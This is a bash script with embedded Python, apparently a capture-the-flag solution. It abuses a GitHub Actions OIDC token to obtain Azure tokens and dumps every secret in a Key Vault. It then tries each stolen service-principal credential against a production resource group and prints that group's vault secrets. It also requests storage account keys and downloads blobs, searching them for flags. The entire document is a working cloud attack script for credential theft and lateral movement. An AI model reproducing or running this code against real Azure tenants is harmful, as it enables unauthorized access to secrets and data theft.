#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
M="https://management.azure.com"; RG2="rg-tbl-reporting-prod-eus"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
KVT=oidc("https://vault.azure.net/.default")
creds={"__oidc__":None}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
def tok(c, sc):
    if c is None: return oidc(sc)
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],"scope":sc,"grant_type":"client_credentials"})
    return jg(b).get("access_token")

print("### who can see rg-tbl-reporting-prod-eus ?")
winner=None
for name,c in creds.items():
    t=tok(c, "https://management.azure.com/.default")
    if not t: print(f"  {name:28} no token"); continue
    H={"Authorization":"Bearer "+t}
    st,b=http(f"{M}/subscriptions/{SUB}/resourcegroups/{RG2}/resources?api-version=2021-04-01", headers=H)
    vals=jg(b).get("value",[])
    print(f"  {name:28} HTTP {st} resources={len(vals)}")
    for r in vals:
        print(f"      {r['type']:52} {r['name']}  ({r.get('location')})")
    if st==200 and vals: winner=(name,c,t,vals)

if winner:
    name,c,ARM,vals = winner
    print(f"\n### enumerating with {name}")
    H={"Authorization":"Bearer "+ARM}
    for r in vals:
        ty=r["type"]; nm=r["name"]
        if ty=="Microsoft.KeyVault/vaults":
            kt=tok(c,"https://vault.azure.net/.default")
            st,b=http(f"https://{nm}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":"Bearer "+kt})
            print(f"  KV {nm}: list {st}")
            for s in jg(b).get("value",[]):
                sn=s["id"].rsplit("/",1)[-1]
                st2,b2=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+kt})
                v=jg(b2).get("value","")
                print(f"     >>> {sn} = {v}")
        if ty=="Microsoft.Storage/storageAccounts":
            st,b=http(f"{M}/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Storage/"
                      f"storageAccounts/{nm}/listKeys?api-version=2023-01-01", data=b"", headers=H, method="POST")
            print(f"  ST {nm}: listKeys {st}")
            stk=tok(c,"https://storage.azure.com/.default")
            HB={"Authorization":"Bearer "+stk,"x-ms-version":"2021-08-06"}
            st2,b2=http(f"https://{nm}.blob.core.windows.net/?comp=list", headers=HB)
            conts=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b2)] if st2==200 else []
            print(f"     containers({st2}): {conts}")
            for cn in conts:
                st3,b3=http(f"https://{nm}.blob.core.windows.net/{cn}?restype=container&comp=list", headers=HB)
                blobs=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b3)] if st3==200 else []
                print(f"       {cn}({st3}): {blobs[:25]}")
                for bl in blobs[:25]:
                    st4,bb=http(f"https://{nm}.blob.core.windows.net/{cn}/{urllib.parse.quote(bl)}", headers=HB)
                    if st4==200:
                        m=FLAG.search(bb)
                        print(f"          {bl}: " + (f">>> FLAG {m.group(1).decode()}" if m else bb[:200].decode('utf-8','replace')))
PYEOF
echo "=== done ==="